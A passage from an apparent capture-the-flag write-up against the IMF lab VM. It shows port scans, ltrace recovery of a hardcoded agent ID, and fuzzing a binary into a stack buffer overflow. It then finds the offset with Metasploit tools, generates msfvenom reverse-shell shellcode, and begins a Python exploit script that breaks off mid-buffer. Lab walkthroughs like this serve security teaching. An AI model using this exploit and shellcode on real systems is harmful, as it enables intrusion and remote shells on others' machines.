+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:09 EDT
+Warning: 192.168.1.62 giving up on port because retransmission cap hit (0).
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00051s latency).
+PORT     STATE    SERVICE
+8279/tcp filtered unknown
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:09 EDT
+Warning: 192.168.1.62 giving up on port because retransmission cap hit (0).
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00044s latency).
+PORT     STATE    SERVICE
+9467/tcp filtered unknown
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
+root@kali:~# nmap -p- --min-rate=400 -T4 192.168.1.62
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:09 EDT
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00084s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+7788/tcp open  unknown
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 87.03 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sweet, 7788 opened up and upon connection I was presented with the same IMF agent services prompt.&lt;/p&gt;
+
+&lt;p&gt;Luckily, finding the agent string was easy as ltrace was installed on the target.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@imf:/usr/local/bin$ ltrace ./agent
+ltrace ./agent
+__libc_start_main(0x80485fb, 1, 0xffe0d274, 0x8048970 &amp;lt;unfinished ...&amp;gt;
+setbuf(0xf779bd60, 0)                            = &amp;lt;void&amp;gt;
+asprintf(0xffe0d1a8, 0x80489f0, 0x2ddd984, 0xf76030ec) = 8
+puts(&quot;  ___ __  __ ___ &quot;  ___ __  __ ___
+)                        = 18
+puts(&quot; |_ _|  \\/  | __|  Agent&quot; |_ _|  \/  | __|  Agent
+)                = 25
+puts(&quot;  | || |\\/| | _|   Reporting&quot;  | || |\/| | _|   Reporting
+)            = 29
+puts(&quot; |___|_|  |_|_|    System\n&quot; |___|_|  |_|_|    System
+
+)              = 27
+printf(&quot;\nAgent ID : &quot;
+Agent ID : )                          = 12
+fgets(12
+&quot;12\n&quot;, 9, 0xf779b5a0)                     = 0xffe0d1ae
+strncmp(&quot;12\n&quot;, &quot;48093572&quot;, 8)                   = -1 &amp;lt;&amp;lt;&amp;lt;---- Agent Number
+puts(&quot;Invalid Agent ID &quot;Invalid Agent ID
+)                        = 18
++++ exited (status 254) +++
+www-data@imf:/usr/local/bin$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I copied the binary over to my host and started some fuzzing. Found a seg fault in the Submit Report function.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/tmp# ./agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 48093572
+Login Validated
+Main Menu:
+1. Extraction Points
+2. Request Extraction
+3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Report: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Submitted for review.
+root@kali:/tmp# ./agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 48093572
+Login Validated
+Main Menu:
+1. Extraction Points
+2. Request Extraction
+3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Report: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Submitted for review.
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now comes the fun part :)&lt;/p&gt;
+
+&lt;p&gt;I’ve posted the majority of my output below, should be simple enough to follow the steps but if you have questions feel free to comment and let me know.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/tmp# locate pattern_create.rb
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
+root@kali:/tmp#
+root@kali:/tmp# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -h
+Usage: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb [options]
+Example: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 -s ABC,def,123
+Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf
+
+Options:
+    -l, --length &amp;lt;length&amp;gt;            The length of the pattern
+    -s, --sets &amp;lt;ABC,def,123&amp;gt;         Custom Pattern Sets
+    -h, --help                       Show this message
+root@kali:/tmp#
+root@kali:/tmp# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+
+root@kali:/tmp# gdb -q ./agent
+Reading symbols from ./agent...(no debugging symbols found)...done.
+(gdb) 48093572
+Undefined command: &quot;48093572&quot;.  Try &quot;help&quot;.
+(gdb) run
+Starting program: /tmp/agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 48093572
+Login Validated
+Main Menu:
+1. Extraction Points
+2. Request Extraction
+3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+Report: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+Submitted for review.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366641 in ?? () &amp;lt;&amp;lt;&amp;lt;&amp;lt;---- OFFSET
+(gdb)
+
+root@kali:/tmp# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 41366641
+[*] Exact match at offset 168
+
+root@kali:/tmp# python -c 'print &quot;A&quot;*168 + &quot;B&quot;*4'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+root@kali:/tmp#
+root@kali:/tmp# gdb -q ./agent
+Reading symbols from ./agent...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /tmp/agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 48093572
+Login Validated
+Main Menu:
+1. Extraction Points
+2. Request Extraction
+3. Submit Report
+0. Exit
+Enter selection: 3
+
+Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Report: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+Submitted for review.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? () &amp;lt;&amp;lt;&amp;lt;&amp;lt; ---- Confirmed offset
+(gdb)
+(gdb)
+(gdb) i r
+eax            0xbffff394	-1073745004
+ecx            0xffffffff	-1
+edx            0xb7fb4870	-1208268688
+ebx            0x0	0
+esp            0xbffff440	0xbffff440
+ebp            0x41414141	0x41414141
+esi            0xb7fb3000	-1208274944
+edi            0xb7fb3000	-1208274944
+eip            0x42424242	0x42424242
+eflags         0x10286	[ PF SF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x/40x $eax   &amp;lt;&amp;lt;&amp;lt;&amp;lt; ---- Our string is stored in EAX
+0xbffff394:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3a4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3b4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3c4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3d4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3e4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff3f4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff404:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff414:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff424:	0x41414141	0x41414141	0xbffff394	0x41414141
+
+root@kali:/tmp# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm &amp;gt; call eax
+00000000  FFD0              call eax
+nasm &amp;gt; quit
+root@kali:/tmp#
+root@kali:/tmp# objdump -d ./agent | grep 'ff d0'
+ 8048563:	ff d0                	call   *%eax
+root@kali:/tmp#
+root@kali:/tmp# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.60 LPORT=4443 -f python -b &quot;\x00\x0a\x0d&quot;
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of python file: 470 bytes
+buf =  &quot;&quot;
+buf += &quot;\xbb\x3a\xe0\x27\x8b\xdb\xc4\xd9\x74\x24\xf4\x5a\x2b&quot;
+buf += &quot;\xc9\xb1\x12\x83\xea\xfc\x31\x5a\x0e\x03\x60\xee\xc5&quot;
+buf += &quot;\x7e\xa5\x35\xfe\x62\x96\x8a\x52\x0f\x1a\x84\xb4\x7f&quot;
+buf += &quot;\x7c\x5b\xb6\x13\xd9\xd3\x88\xde\x59\x5a\x8e\x19\x31&quot;
+buf += &quot;\x9d\xd8\xdb\xfd\x75\x1b\xdc\xec\xde\x92\x3d\xbe\x87&quot;
+buf += &quot;\xf4\xec\xed\xf4\xf6\x87\xf0\x36\x78\xc5\x9a\xa6\x56&quot;
+buf += &quot;\x99\x32\x5f\x86\x72\xa0\xf6\x51\x6f\x76\x5a\xeb\x91&quot;
+buf += &quot;\xc6\x57\x26\xd1&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the final exploit script.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'192.168.1.62'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7788&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;48093572&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbb\x3a\xe0\x27\x8b\xdb\xc4\xd9\x74\x24\xf4\x5a\x2b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc9\xb1\x12\x83\xea\xfc\x31\x5a\x0e\x03\x60\xee\xc5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7e\xa5\x35\xfe\x62\x96\x8a\x52\x0f\x1a\x84\xb4\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7c\x5b\xb6\x13\xd9\xd3\x88\xde\x59\x5a\x8e\x19\x31&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x9d\xd8\xdb\xfd\x75\x1b\xdc\xec\xde\x92\x3d\xbe\x87&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf4\xec\xed\xf4\xf6\x87\xf0\x36\x78\xc5\x9a\xa6\x56&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x99\x32\x5f\x86\x72\xa0\xf6\x51\x6f\x76\x5a\xeb\x91&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
